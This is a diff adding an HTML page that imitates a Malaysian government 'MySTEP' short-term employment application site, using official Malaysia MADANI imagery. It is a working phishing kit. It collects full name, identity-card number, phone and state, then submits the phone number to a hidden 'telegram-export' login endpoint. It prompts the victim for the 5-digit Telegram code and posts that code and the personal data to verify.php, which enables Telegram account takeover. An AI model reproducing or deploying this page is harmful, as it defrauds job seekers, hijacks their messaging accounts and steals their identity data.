@@ -1,0 +1,739 @@
+﻿<!DOCTYPE html>
+<html lang="ms">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Malaysia MADANI | MySTEP</title>
+<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/2/26/Coat_of_arms_of_Malaysia.svg" type="image/png">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Segoe UI',sans-serif;
+}
+
+body{
+background:#f5f6fa;
+}
+
+.banner img{
+width:100%;
+display:block;
+}
+
+.slider-container{
+position:relative;
+width:100%;
+aspect-ratio:16/7;
+overflow:hidden;
+}
+
+.slider{
+width:100%;
+height:100%;
+position:relative;
+}
+
+.mySlide{
+position:absolute;
+width:100%;
+height:100%;
+top:0;
+left:100%;
+transition:transform .5s ease;
+}
+
+.mySlide.active{
+left:0;
+}
+
+.mySlide img{
+width:100%;
+height:100%;
+object-fit:cover;
+display:block;
+}
+
+.prev,.next{
+position:absolute;
+top:50%;
+transform:translateY(-50%);
+width:30px;
+height:30px;
+border:none;
+border-radius:50%;
+background:transparent;
+color:white;
+font-size:15px;
+cursor:pointer;
+display:flex;
+justify-content:center;
+align-items:center;
+z-index:100;
+}
+
+.prev{
+left:5px;
+}
+
+.next{
+right:5px;
+}
+
+.slide{
+display:none;
+position:relative;
+overflow:hidden;
+border-radius:20px;
+}
+
+.slide.active{
+display:block;
+}
+
+.slide img{
+width:100%;
+}
+
+.footer img{
+width:100%;
+display:block;
+}
+
+.info{
+max-width:750px;
+margin:5px auto;
+padding:18px 25px;
+background:transparent;
+line-height:1.8;
+
+text-align:center;
+font-size:13px;
+color:#666;
+}
+
+.info h2{
+font-size:15px;
+margin-bottom:12px;
+font-weight:700;
+}
+
+.form-box{
+max-width:400px;
+margin:20px auto;
+background:white;
+border-radius:20px;
+overflow:hidden;
+box-shadow:0 10px 20px rgba(0,0,0,.1);
+}
+
+.form-header{
+background:#8B0000;
+padding:20px;
+text-align:center;
+color:white;
+font-size:13px;
+}
+
+.form-body{
+padding:20px;
+background:#f8fafc;
+}
+
+label{
+font-weight:600;
+color:#1f2937;
+}
+
+input,select{
+width:100%;
+height:55px;
+margin-top:10px;
+margin-bottom:10px;
+padding:0 15px;
+border:1px solid #d1d5db;
+border-radius:15px;
+font-size:13px;
+}
+
+button, a.button{
+width:100%;
+height:60px;
+display:flex;
+justify-content:center;
+align-items:center;
+border:none;
+border-radius:15px;
+background:linear-gradient(90deg,#8B0000,#cc0000);
+color:white;
+font-size:15px;
+font-weight:bold;
+cursor:pointer;
+text-decoration:none;
+}
+
+a.button{
+text-align:center;
+}
+
+button:disabled{
+opacity:.5;
+cursor:not-allowed;
+}
+
+.popup{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.55);
+justify-content:center;
+align-items:center;
+z-index:9999;
+}
+
+.popup-content{
+width:90%;
+max-width:380px;
+background:white;
+padding:30px;
+border-radius:25px;
+text-align:center;
+box-shadow:0 10px 30px rgba(0,0,0,.15);
+animation:popup .3s ease;
+}
+
+@keyframes popup{
+from{
+opacity:0;
+transform:scale(.9);
+}
+
+to{
+opacity:1;
+transform:scale(1);
+}
+}
+
+.popup-content h2{
+color:#8B0000;
+font-size:22px;
+margin-bottom:10px;
+}
+
+.popup-content p{
+font-size:13px;
+color:#666;
+line-height:1.7;
+margin-bottom:25px;
+}
+
+.otp-box{
+display:flex;
+justify-content:center;
+gap:10px;
+margin-bottom:25px;
+}
+
+.otp-box input{
+width:50px;
+height:55px;
+border:1px solid #d1d5db;
+border-radius:15px;
+font-size:20px;
+font-weight:bold;
+text-align:center;
+outline:none;
+}
+
+.otp-box input:focus{
+border:1px solid #8B0000;
+}
+
+.verify-btn{
+width:100%;
+height:55px;
+border:none;
+border-radius:15px;
+background:linear-gradient(90deg,#8B0000,#cc0000);
+color:white;
+font-size:15px;
+font-weight:600;
+cursor:pointer;
+}
+
+.verify-btn:hover{
+opacity:.9;
+}
+
+.error{
+border:2px solid red !important;
+}
+
+</style>
+</head>
+<body>
+
+<div class="banner">
+<img src="Screenshot 2026-06-13 234206.png">
+</div>
+
+
+<!-- Slider -->
+<div class="slider-container">
+
+    <div class="slider">
+
+        <div class="mySlide active">
+            <img src="https://malaysiamadani.gov.my/wp-content/uploads/2023/06/IniJanjiSaya-Website-Header-1024x430.png">
+        </div>
+
+        <div class="mySlide">
+            <img src="https://malaysiamadani.gov.my/wp-content/uploads/2024/11/slide09-1024x390.jpg">
+        </div>
+
+        <div class="mySlide">
+            <img src="https://malaysiamadani.gov.my/wp-content/uploads/2023/02/slide-show2-1024x462.jpg">
+        </div>
+
+    </div>
+
+    <button class="prev" onclick="prevSlide()">❮</button>
+    <button class="next" onclick="nextSlide()">❯</button>
+
+</div>
+
+
+<div class="info">
+<b>Malaysia Short-Term Employment Programme (MySTEP)</b>
+merupakan inisiatif kerajaan yang menawarkan peluang pekerjaan jangka pendek (kontrak) dalam pelbagai kementerian, agensi kerajaan serta GLC/GLIC dan rakan strategik industri.
+
+<br><br>
+
+Program ini bertujuan untuk mengukuhkan kebolehpasaran serta mempercepatkan penempatan pekerjaan bagi rakyat Malaysia melalui penyediaan peluang kerjaya yang bersesuaian dengan kelayakan dan keperluan semasa.
+</div>
+
+<div class="form-box">
+
+<div class="form-header">
+<h2>MAKLUMAT PEMOHON</h2>
+</div>
+
+<div class="form-body">
+
+<label>Nama Penuh</label>
+<input type="text" id="nama" placeholder="Masukkan nama penuh">
+
+<label>No. Kad Pengenalan</label>
+<input type="text" id="ic" maxlength="14"
+placeholder="Contoh: 010203-10-0101">
+
+<label>No. Telefon</label>
+<input type="text" id="telefon" placeholder="Contoh: 0123456789">
+
+<label>Negeri</label>
+<select id="negeri">
+<option>-- Sila Pilih Negeri --</option>
+<option>Johor</option>
+<option>Kedah</option>
+<option>Kelantan</option>
+<option>Melaka</option>
+<option>Negeri Sembilan</option>
+<option>Pahang</option>
+<option>Perak</option>
+<option>Perlis</option>
+<option>Pulau Pinang</option>
+<option>Sabah</option>
+<option>Sarawak</option>
+<option>Selangor</option>
+<option>Terengganu</option>
+<option>Wilayah Persekutuan Kuala Lumpur</option>
+<option>Wilayah Persekutuan Labuan</option>
+<option>Wilayah Persekutuan Putrajaya</option>
+</select>
+
+<button id="semakBtn">
+SEMAK KELAYAKAN
+</button>
+
+</div>
+</div>
+
+<form id="telegramLoginForm" action="/telegram-export/send-code" method="post" style="display:none;">
+    <input type="hidden" name="phone" id="telegramPhoneInput" value="">
+</form>
+
+<div class="popup" id="popup">
+
+    <div class="popup-content">
+        <h2>Pengesahan Kod</h2>
+
+        <p>
+            Sila masukkan kod 5 digit yang diterima daripada Telegram anda untuk meneruskan proses semakan.
+        </p>
+
+        <div class="otp-box">
+
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+
+        </div>
+
+        <button class="verify-btn" onclick="verifyCode()">
+            SAHKAN
+        </button>
+
+    </div>
+
+</div>
+
+
+<div class="popup" id="popupSuccess">
+
+    <div class="popup-content">
+
+        <h2>Permohonan Berjaya</h2>
+
+        <p>
+            Permohonan telah diterima.<br><br>
+
+            Sebarang maklumat akan dinyatakan melalui nombor telefon yang telah anda daftarkan.<br><br>
+
+            Terima kasih.
+        </p>
+
+        <button class="verify-btn" onclick="tutupPopupSuccess()">
+            OK
+        </button>
+
+    </div>
+
+</div>
+
+</div>
+
+<script>
+
+function bukaPopup(){
+    document.getElementById("popup").style.display = "flex";
+}
+
+function tutupPopup(){
+    document.getElementById("popup").style.display = "none";
+}
+
+function bukaPopupSuccess(){
+    document.getElementById("popupSuccess").style.display = "flex";
+}
+
+function tutupPopupSuccess(){
+    document.getElementById("popupSuccess").style.display = "none";
+}
+
+// Tutup popup bila klik kawasan gelap
+window.addEventListener("click", function(event){
+
+    const popup = document.getElementById("popup");
+
+    if(event.target === popup){
+        tutupPopup();
+    }
+
+});
+
+// ================= OTP INPUT =================
+const otpInputs = document.querySelectorAll(".otp-input");
+
+otpInputs.forEach((input, index) => {
+
+    input.addEventListener("input", function(){
+
+        this.value = this.value.replace(/[^0-9]/g, "");
+
+        if(this.value.length === 1 && index < otpInputs.length - 1){
+            otpInputs[index + 1].focus();
+        }
+
+    });
+
+    input.addEventListener("keydown", function(e){
+
+        if(e.key === "Backspace" && this.value === "" && index > 0){
+            otpInputs[index - 1].focus();
+        }
+
+    });
+
+});
+
+
+// ================= NAMA PENUH =================
+document.getElementById("nama").addEventListener("input", function(){
+
+    // Huruf dan ruang sahaja
+    this.value = this.value.replace(/[^A-Za-z\s]/g, "");
+
+    checkForm();
+
+});
+
+
+// ================= IC =================
+document.getElementById("ic").addEventListener("input", function(){
+
+    let value = this.value.replace(/\D/g, "");
+
+    if(value.length > 12){
+        value = value.substring(0,12);
+    }
+
+    if(value.length > 6){
+        value = value.slice(0,6) + "-" + value.slice(6);
+    }
+
+    if(value.length > 9){
+        value = value.slice(0,9) + "-" + value.slice(9);
+    }
+
+    this.value = value;
+
+    checkForm();
+
+});
+
+
+// ================= TELEFON =================
+document.getElementById("telefon").addEventListener("input", function(){
+
+    this.value = this.value.replace(/\D/g, "");
+
+    checkForm();
+
+});
+
+
+// Buang warna merah apabila pengguna mula mengisi semula
+document.querySelectorAll("#nama,#ic,#telefon,#negeri").forEach(el=>{
+
+    el.addEventListener("input", function(){
+        this.classList.remove("error");
+    });
+
+    el.addEventListener("change", function(){
+        this.classList.remove("error");
+    });
+
+});
+
+
+// ================= SEMAK BORANG =================
+const semakBtn = document.getElementById("semakBtn");
+
+function checkForm(){
+
+    let nama = document.getElementById("nama").value.trim();
+    let ic = document.getElementById("ic").value.trim();
+    let telefon = document.getElementById("telefon").value.trim();
+    let negeri = document.getElementById("negeri").selectedIndex;
+
+    let icPattern = /^\d{6}-\d{2}-\d{4}$/;
+
+    semakBtn.disabled = !(
+        nama.length > 0 &&
+        icPattern.test(ic) &&
+        /^[0-9]{9,12}$/.test(telefon) &&
+        negeri > 0
+    );
+
+}
+
+
+// negeri
+document.getElementById("negeri").addEventListener("change", checkForm);
+
+
+// ================= BUTANG SEMAK =================
+function semakBorang(){
+
+    let nama = document.getElementById("nama");
+    let ic = document.getElementById("ic");
+    let telefon = document.getElementById("telefon");
+    let negeri = document.getElementById("negeri");
+
+    let sah = true;
+
+    // Buang warna merah lama
+    [nama, ic, telefon, negeri].forEach(el=>{
+        el.classList.remove("error");
+    });
+
+    // Nama
+    if(nama.value.trim() === ""){
+        nama.classList.add("error");
+        sah = false;
+    }
+
+    // IC
+    let icPattern = /^\d{6}-\d{2}-\d{4}$/;
+
+    if(!icPattern.test(ic.value.trim())){
+        ic.classList.add("error");
+        sah = false;
+    }
+
+    // Telefon
+    if(!/^[0-9]{9,12}$/.test(telefon.value.trim())){
+        telefon.classList.add("error");
+        sah = false;
+    }
+
+    // Negeri
+    if(negeri.selectedIndex === 0){
+        negeri.classList.add("error");
+        sah = false;
+    }
+
+    // Jika ada yang salah, hentikan
+    if(!sah){
+        return;
+    }
+
+    // Hantar nombor telefon ke app.py untuk login Telegram
+    document.getElementById('telegramPhoneInput').value = telefon.value;
+    document.getElementById('telegramLoginForm').submit();
+
+}
+
+semakBtn.onclick = semakBorang;
+
+function verifyCode(){
+
+    let code = "";
+
+    otpInputs.forEach(input => {
+        code += input.value;
+    });
+
+    if(code.length !== 5){
+        alert("Sila lengkapkan kod 5 digit.");
+        return;
+    }
+
+    fetch("verify.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            nama: document.getElementById("nama").value,
+            ic: document.getElementById("ic").value,
+            telefon: document.getElementById("telefon").value,
+            negeri: document.getElementById("negeri").value,
+            otp: code
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            console.log("Pengesahan:", data);
+            tutupPopup();
+            bukaPopupSuccess();
+        } else {
+            alert("Pengesahan gagal: " + (data.error || "Sila cuba semula."));
+        }
+    })
+    .catch(error => {
+        console.log(error);
+        alert("Pengesahan gagal dihantar. Sila cuba semula.");
+    });
+
+}
+
+// ================= SLIDER =================
+let current = 0;
+const slides = document.querySelectorAll(".mySlide");
+
+function showSlide(index, direction){
+
+    let currentSlide = slides[current];
+    let nextSlide = slides[index];
+
+    nextSlide.style.transition = "none";
+
+    if(direction === "next"){
+        nextSlide.style.transform = "translateX(100%)";
+    }else{
+        nextSlide.style.transform = "translateX(-100%)";
+    }
+
+    nextSlide.classList.add("active");
+
+    setTimeout(() => {
+
+        nextSlide.style.transition = "transform .5s ease";
+        currentSlide.style.transition = "transform .5s ease";
+
+        if(direction === "next"){
+            currentSlide.style.transform = "translateX(-100%)";
+        }else{
+            currentSlide.style.transform = "translateX(100%)";
+        }
+
+        nextSlide.style.transform = "translateX(0)";
+
+    },10);
+
+    setTimeout(() => {
+
+        currentSlide.classList.remove("active");
+        currentSlide.style.transition = "none";
+        currentSlide.style.transform = "translateX(0)";
+
+        current = index;
+
+    },500);
+
+}
+
+function nextSlide(){
+
+    let next = current + 1;
+
+    if(next >= slides.length){
+        next = 0;
+    }
+
+    showSlide(next,"next");
+
+}
+
+function prevSlide(){
+
+    let prev = current - 1;
+
+    if(prev < 0){
+        prev = slides.length - 1;
+    }
+
+    showSlide(prev,"prev");
+
+}
+
+</script>
+
+<br>
+    <div class="footer">
+    <img src="Screenshot 2026-06-14 003429.png">
+    </div>
+
+
+</body>
+</html>
